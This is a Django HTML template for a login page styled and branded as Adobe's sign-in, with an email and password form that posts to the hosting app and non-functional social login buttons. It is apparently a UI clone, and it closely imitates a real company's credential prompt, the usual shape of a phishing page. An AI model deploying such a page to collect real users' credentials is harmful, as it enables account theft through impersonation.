<!DOCTYPE html>
<html lang="en">
    {% load static %}

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>

    <!-- Font Awesome for Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: url("{% static 'images/background.jpg' %}") no-repeat center center fixed;
            background-size: cover;
            height: 100vh;
            display: flex;
            align-items: center;
            padding: 5%;
        }

        /* Branding Section */
        .branding {
            flex: 1;
            display: flex;
            justify-content: flex-start;
            align-items: center;
            text-align: left;
            color: white;
            padding: 50px;
            margin-left: 40px;
        }

        .branding h1 {
            font-size: 36px;
            font-weight: bold;
            
        }

        .branding p {
            font-size: 18px;
            margin-top: 10px;
            opacity: 0.8;
        }

        /* Login Container */
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
        }

        h2 {
            margin-bottom: 10px;
            font-size: 24px;
            text-align: left;
        }

        .small-text {
            font-size: 12px;
            text-align: left;
            color: gray;
            margin-bottom: 10px;
        }

        a {
            text-decoration: none;
            color: #007BFF;
        }

        .form-group {
            margin-bottom: 20px;
            position: relative;
            text-align: left;
        }

        .form-group input {
            width: 100%;
            padding: 15px 10px 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            outline: none;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            color: gray;
            margin-bottom: 5px;
        }

        .btn-container {
            display: flex;
            justify-content: flex-end;
        }

        .btn {
            padding: 6px 12px;
            background: #007BFF;
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 13px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn:hover {
            background: #0056b3;
        }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 15px 0;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #ccc;
            margin: 5px;
        }

        .social-btn {
            width: 100%;
            padding: 10px;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
            transition: 0.3s;
            border: 1px solid transparent;
        }

        .social-btn i {
            margin-right: 10px;
            font-size: 16px;
        }

        .google {
            background: #fff;
            color: #333;
            border: 1px solid #ccc;
        }

        .google:hover {
            background: #f0f0f0;
        }

        .facebook {
            background: #1877F2;
            color: white;
        }

        .facebook:hover {
            background: #1258c1;
        }

        .apple {
            background: black;
            color: white;
        }

        .apple:hover {
            background: #333;
        }

        /* Flexbox for Layout */
        .container {
            display: flex;
            width: 100%;
        }

        /* Chat Icon */
        /* Chat Icon */
            .chat-icon {
                position: fixed;
                bottom: 20px;
                right: 20px;
                width: 40px;
                height: 40px;
                background: white;
                color: black;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 20px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
                cursor: pointer;
                transition: background 0.3s, transform 0.2s;
            }

            .chat-icon:hover {
                background: #f0f0f0;
                transform: scal  e(1.1);
            }
            .error-message {
                color: red;
                font-size: 14px;
                margin-bottom: 10px;
            }

    </style>
</head>
<body>

    <div class="container">
        <!-- Branding Section -->
        <div class="branding">
            <div>
                <h1><img height="40px" src="{% static 'images/adobe.jpg' %}">Adobe</h1>
                <p>Sign in or create an account</p>
            </div>
        </div>

        <!-- Login Container -->
        <div class="login-container">
            <h2>Sign in</h2>
            {% if error %}
            <p class="error-message">{{ error }}</p>
            {% endif %}
            <p class="small-text">New user? <a href="#">Create an account</a></p>

            <form method="post">
                {% csrf_token %}
                <div class="form-group">
                    <label for="email">Email</label>
                    <input type="email" name="email" id="email" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" name="password" id="password" required>
                </div>
                <div class="btn-container">
                    <button type="submit" class="btn">Continue</button>
                </div>
            </form>

            <div class="divider">Or</div>

            <button class="social-btn google">
                <i class="fa-brands fa-google"></i> Continue with Google
            </button>
            <button class="social-btn facebook">
                <i class="fa-brands fa-facebook"></i> Continue with Facebook
            </button>
            <button class="social-btn apple">
                <i class="fa-brands fa-apple"></i> Continue with Apple
            </button>

            <p class="small-text"><a href="#">Get help signing in</a></p>
        </div>
    </div>

    <!-- Chat Icon -->
    <div class="chat-icon">
        <i class="fa-solid fa-comment"></i>
    </div>

</body>
</html>
